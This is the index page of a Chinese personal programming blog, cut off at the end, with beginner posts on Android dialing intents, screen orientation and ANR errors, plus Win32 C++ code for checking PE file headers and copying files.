<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Wker</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一个萌新">
<meta property="og:type" content="website">
<meta property="og:title" content="Wker">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Wker">
<meta property="og:description" content="一个萌新">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Wker">
<meta property="article:tag" content="程序员">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Wker" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Wker</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">计算机安全</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Intent实现拨号" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/28/Intent%E5%AE%9E%E7%8E%B0%E6%8B%A8%E5%8F%B7/" class="article-date">
  <time datetime="2020-01-28T02:11:44.000Z" itemprop="datePublished">2020-01-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/28/Intent%E5%AE%9E%E7%8E%B0%E6%8B%A8%E5%8F%B7/">Intent实现拨号</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="实例：手机拨号"><a href="#实例：手机拨号" class="headerlink" title="实例：手机拨号"></a>实例：手机拨号</h2><p>这个东西其实就是打开一个Activity然后在打开的过程中传输我们我的手机号，思路就是获取Edittext输入的值，然后在我们是用隐式intent的传输我们的手机号给指定的Activity就可以进行实现手机拨号的功能，具体的实现代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">activity</span> <span class="keyword">extends</span> <span class="title">Activity</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Button btn01;</span><br><span class="line">	<span class="keyword">private</span> EditText edt01;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_01);</span><br><span class="line">		edt01 = (EditText)findViewById(R.id.editText1);</span><br><span class="line">		btn01 = (Button)findViewById(R.id.button1);</span><br><span class="line">		btn01.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				String phoneNumber = edt01.getText().toString();</span><br><span class="line">				Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">				intent.setAction(<span class="string">"android.intent.action.CALL"</span>);</span><br><span class="line">				intent.addCategory(<span class="string">"android.intent.category.DEFAULT"</span>);</span><br><span class="line">				intent.setData(Uri.parse(<span class="string">"tel:"</span>+phoneNumber));</span><br><span class="line">				startActivity(intent);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要注意手机的是拨号的Intent-filter：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intent.setAction(<span class="string">"android.intent.action.CALL"</span>);</span><br><span class="line">intent.addCategory(<span class="string">"android.intent.category.DEFAULT"</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">"tel:"</span>+phoneNumber));</span><br></pre></td></tr></table></figure>
<p>tel协议后面要跟上我们的手机号。<br>但是这个时候并不能正常运行，因为我们没有这个权限，拨号算是手机的底层功能，所以需要特殊的一个权限，这个就是在安装的时候我们点击安装程序自动提示给我们是否允许这个功能（安装的时候都见到过），所以我们在AndroidManifest.xml中进行一个权限的请求：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CALL_PHONE"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个就是请求拨号权限，这个之后我们的程序就能够正常的拨号了！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/28/Intent%E5%AE%9E%E7%8E%B0%E6%8B%A8%E5%8F%B7/" data-id="ck5xij35d000we0wje2mx2k8z" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-PE文件判定" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/27/PE%E6%96%87%E4%BB%B6%E5%88%A4%E5%AE%9A/" class="article-date">
  <time datetime="2020-01-27T09:28:28.000Z" itemprop="datePublished">2020-01-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/27/PE%E6%96%87%E4%BB%B6%E5%88%A4%E5%AE%9A/">PE文件判定</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="PE文件有效性验证"><a href="#PE文件有效性验证" class="headerlink" title="PE文件有效性验证"></a>PE文件有效性验证</h2><p>之前自己写了一个自己读的PE区段的小程序（当时是模仿CE写的一个内存搜索工具），当时写的是真的按照微软给的格式（什么NT头什么DOS头乱七八糟的）一个字节一个字节找的，但是后来发现居然有一个结构体居然可以直接拿来用，哎，失算失算~</p>
<h2 id="IMAGE-DOS-HEADER和IMAGE-NT-HEADERS"><a href="#IMAGE-DOS-HEADER和IMAGE-NT-HEADERS" class="headerlink" title="IMAGE_DOS_HEADER和IMAGE_NT_HEADERS"></a><code>IMAGE_DOS_HEADER</code>和<code>IMAGE_NT_HEADERS</code></h2><p>由于我的MSDN是2001年的，所以这个我是从IDE找到的，没有注释，但是大体的结构还是能看懂的。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span></span><br><span class="line">      WORD e_magic;</span><br><span class="line">      WORD e_cblp;</span><br><span class="line">      WORD e_cp;</span><br><span class="line">      WORD e_crlc;</span><br><span class="line">      WORD e_cparhdr;</span><br><span class="line">      WORD e_minalloc;</span><br><span class="line">      WORD e_maxalloc;</span><br><span class="line">      WORD e_ss;</span><br><span class="line">      WORD e_sp;</span><br><span class="line">      WORD e_csum;</span><br><span class="line">      WORD e_ip;</span><br><span class="line">      WORD e_cs;</span><br><span class="line">      WORD e_lfarlc;</span><br><span class="line">      WORD e_ovno;</span><br><span class="line">      WORD e_res[<span class="number">4</span>];</span><br><span class="line">      WORD e_oemid;</span><br><span class="line">      WORD e_oeminfo;</span><br><span class="line">      WORD e_res2[<span class="number">10</span>];</span><br><span class="line">      LONG e_lfanew;</span><br><span class="line">    &#125; IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">      DWORD Signature;</span><br><span class="line">      IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">      IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">    &#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>
<p>这个就是微软定义的一个结构，我们用这个结构就能够轻松的读取了，思路就是先打开文件，后读取文件，判断DOS头，判断NT头。<br>实现的代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	IMAGE_DOS_HEADER dosHeader;</span><br><span class="line">	IMAGE_NT_HEADERS ntHeaders;</span><br><span class="line">	<span class="keyword">char</span> * text = <span class="keyword">new</span> <span class="keyword">char</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Please Input File Address:"</span>; </span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;text;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;text&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	HANDLE hFile = CreateFile(text,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);<span class="comment">//常规的打开一个文件 </span></span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"error file!"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	ReadFile(hFile,&amp;dosHeader,<span class="keyword">sizeof</span>(dosHeader),&amp;dwRead,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(dwRead == <span class="keyword">sizeof</span>(dosHeader))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(dosHeader.e_magic == IMAGE_DOS_SIGNATURE)<span class="comment">//判断是不是MZ，就是你常见的那个</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(SetFilePointer(hFile,dosHeader.e_lfanew,<span class="literal">NULL</span>,FILE_BEGIN) != <span class="number">-1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				ReadFile(hFile,&amp;ntHeaders,<span class="keyword">sizeof</span>(ntHeaders),&amp;dwRead,<span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span>(dwRead == <span class="keyword">sizeof</span>(ntHeaders))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(ntHeaders.Signature == IMAGE_NT_SIGNATURE)<span class="comment">//判断是不是那个PE</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">cout</span>&lt;&lt;<span class="string">"Congrate!This is PE File!"</span>;</span><br><span class="line">						<span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"sorry,This is not!"</span> ;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是比较简单的，用这两个结构体，那么具体如何读取区段之后再说！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/27/PE%E6%96%87%E4%BB%B6%E5%88%A4%E5%AE%9A/" data-id="ck5xij35u001ge0wj8kopacwn" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Android-Anr异常" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/27/Android-Anr%E5%BC%82%E5%B8%B8/" class="article-date">
  <time datetime="2020-01-27T02:26:57.000Z" itemprop="datePublished">2020-01-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/27/Android-Anr%E5%BC%82%E5%B8%B8/">Android Anr异常</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="ANR异常"><a href="#ANR异常" class="headerlink" title="ANR异常"></a>ANR异常</h2><p>其实就是主线程卡死，然后无法响应，大于6秒，会出现如下的一个错误报告：<br><img src="img1.jpg" alt="ANR异常"><br>这个时候就是说我们卡死了，代码里如这个样子写：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	Thread.sleep(<span class="number">60000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决办法也很简单，就是放在子线程中写耗时的操作！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/27/Android-Anr%E5%BC%82%E5%B8%B8/" data-id="ck5xij34e0001e0wja4xe57rw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Android横竖屏设置" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/27/Android%E6%A8%AA%E7%AB%96%E5%B1%8F%E8%AE%BE%E7%BD%AE/" class="article-date">
  <time datetime="2020-01-27T02:13:04.000Z" itemprop="datePublished">2020-01-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/27/Android%E6%A8%AA%E7%AB%96%E5%B1%8F%E8%AE%BE%E7%BD%AE/">Android横竖屏设置</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="横竖屏的设置"><a href="#横竖屏的设置" class="headerlink" title="横竖屏的设置"></a>横竖屏的设置</h2><p>在Android的生命周期中，如果我们横竖屏了，那么他将会默认执行销毁和重构Activity界面的一系列操作，这个样子给我们带来了很多麻烦。<br>同样的屏幕大小变换（低版本安卓不会），键盘出现都会出现这个问题，那如何解决：<br>我们在Activity设置中设置：<br><code>android:configChanges=&quot;keyboardHidden|orientation|screenSize&quot;</code><br>设置这么一条代码，就可以实现我们的效果了，这样的话呢我们将不会执行那一系列操作（相当于关程序重新打开程序的操作）了，它将会执行新的一个函数：<code>onConfigurationChanged</code>这个函数，我们只需要在这个地方写代码就好了。</p>
<h2 id="如何知道是横竖屏？"><a href="#如何知道是横竖屏？" class="headerlink" title="如何知道是横竖屏？"></a>如何知道是横竖屏？</h2><p>其实也很简单，就是判断宽和高就可以了！<br>例如如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DisplayMetrics dm = <span class="keyword">new</span> DisplayMetrics();</span><br><span class="line"></span><br><span class="line">getWindowManager().getDefaultDisplay().getMetrics(dm);</span><br><span class="line">Log.d(<span class="string">"ttt"</span>, dm.heightPixels+<span class="string">""</span>+dm.widthPixels);</span><br></pre></td></tr></table></figure>
<p>再就是判断宽和高大小就可以了！</p>
<h2 id="设置一直是横竖屏"><a href="#设置一直是横竖屏" class="headerlink" title="设置一直是横竖屏"></a>设置一直是横竖屏</h2><p>其实也很简单，在Activity配置中配置如下项：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android:screenOrientation="portrait"</span><br><span class="line">android:screenOrientation="landscape"</span><br></pre></td></tr></table></figure>
<p>第一个设置竖屏，第二个设置横屏（只能设置一个！）。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/27/Android%E6%A8%AA%E7%AB%96%E5%B1%8F%E8%AE%BE%E7%BD%AE/" data-id="ck5xij3440000e0wj95yk7pid" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-File-operate2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/26/File-operate2/" class="article-date">
  <time datetime="2020-01-26T13:17:20.000Z" itemprop="datePublished">2020-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/26/File-operate2/">File operate2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="CopyFileEx文件拷贝"><a href="#CopyFileEx文件拷贝" class="headerlink" title="CopyFileEx文件拷贝"></a><code>CopyFileEx</code>文件拷贝</h2><p>一开始想用<code>CopyFile</code>,后来看到了这个，那就快用这个吧，还支持回调函数，看一下MSDN的一个定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CopyFileEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpExistingFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to name of an existing file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR lpNewFileName,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to filename to copy to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPPROGRESS_ROUTINE lpProgressRoutine,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="comment">// pointer to the callback function</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData,    <span class="comment">// to be passed to the callback function</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBOOL pbCancel,  <span class="comment">// flag that can be used to cancel the operation</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCopyFlags <span class="comment">// flags that specify how the file is copied</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>前两个还是比较简单的，第三个参数是一个回调函数，定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD CALLBACK <span class="title">CopyProgressRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalFileSize,  <span class="comment">// total file size, in bytes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamSize,  <span class="comment">// total number of bytes for this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred for </span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwStreamNumber,     <span class="comment">// the current stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCallbackReason,   <span class="comment">// reason for callback</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSourceFile,       <span class="comment">// handle to the source file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hDestinationFile,  <span class="comment">// handle to the destination file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData             <span class="comment">// passed by CopyFileEx</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第四个参数是要传递给回调函数的一个参数，可以为NULL，<br>第五个参数有点意思，就是为了防止文件过大，给了个可以强制结束的一个指针，BOOL类型的，如歌这个指针为TRUE的时候则会终止。<br>第六个参数是一个复制的类型，可以是下面这两个值：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>COPY_FILE_FAIL_IF_EXISTS</td>
<td>The copy operation fails immediately if the target file already exists.</td>
</tr>
<tr>
<td>COPY_FILE_RESTARTABLE</td>
<td>Progress of the copy is tracked in the target file in case the copy fails. The failed copy can be restarted at a later time by specifying the same values for lpExistingFileName and lpNewFileName as those used in the call that failed.</td>
</tr>
<tr>
<td>看名字就明白了，失败退出，失败重新。</td>
<td></td>
</tr>
<tr>
<td>那我们就试一下怎么个回事。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function">DWORD CALLBACK <span class="title">CopyProgressRoutine</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalFileSize,  <span class="comment">// total file size, in bytes</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER TotalBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamSize,  <span class="comment">// total number of bytes for this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LARGE_INTEGER StreamBytesTransferred,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// total number of bytes transferred for </span></span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// this stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwStreamNumber,     <span class="comment">// the current stream</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwCallbackReason,   <span class="comment">// reason for callback</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hSourceFile,       <span class="comment">// handle to the source file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hDestinationFile,  <span class="comment">// handle to the destination file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpData             <span class="comment">// passed by CopyFileEx</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,TotalBytesTransferred.u.LowPart);</span><br><span class="line">	<span class="keyword">return</span> PROGRESS_CONTINUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CopyFileEx(<span class="string">"1.zip"</span>,<span class="string">"1\\3.zip"</span>,CopyProgressRoutine,<span class="literal">NULL</span>,<span class="literal">NULL</span>,COPY_FILE_RESTARTABLE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>看了下，主要就是那个回调函数的返回值比较重要一些，要继续的话呢要返回一个<code>PROGRESS_CONTINUE</code>这个值，其他的都不是太重要，仔细看看参数就好了。</td>
<td></td>
</tr>
<tr>
<td>## 删除文件<code>DeleteFile</code></td>
<td></td>
</tr>
<tr>
<td>这个基本不用说，看下定义就知道了，就一个参数，删除的文件路径。</td>
<td></td>
</tr>
<tr>
